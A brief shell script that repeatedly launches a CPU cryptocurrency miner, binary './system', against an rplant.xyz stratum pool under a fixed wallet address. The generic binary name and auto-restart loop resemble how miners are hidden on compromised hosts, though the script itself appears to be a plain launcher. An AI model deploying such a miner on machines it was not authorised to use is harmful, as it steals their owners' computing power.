#!/bin/sh
#
# Choose nearest stratum:
#       stratum-ru.rplant.xyz   /Moscow/
#       stratum-eu.rplant.xyz   /London/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#
while [ 1 ]; do
./system -a cpupower --no-auto -o stratum+tcps://stratum-asia.rplant.xyz:17029 -u CXLCiEwgd3EhorGYr28PKm2u8kyGpRmLdX.vienna
sleep 5
done
